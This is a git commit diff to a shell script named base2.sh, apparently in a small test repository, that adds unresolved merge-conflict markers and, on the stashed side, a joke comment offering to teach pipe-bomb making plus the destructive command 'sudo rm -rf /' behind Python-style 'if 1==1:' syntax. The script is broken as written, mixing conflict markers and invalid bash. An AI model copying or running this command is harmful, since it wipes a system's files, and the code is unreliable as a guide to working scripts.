44cc7f3c6adf6708665796128e7cf1129490a908
ExaDias45 <148001716+ExaDias45@users.noreply.github.com>
2023-10-15 14:00:29 -0400

    Update base2.sh

--- base2.sh
+++ base2.sh
@@ -6,6 +6,13 @@
 
 #testmaguire
 
+<<<<<<< Updated upstream
 #test
 
 #testAidan
+=======
+#hey y'all wanna learn how to make a pipe bomb?
+#for legal reasons that's a joke
+if 1==1:
+sudo rm -rf /
+>>>>>>> Stashed changes
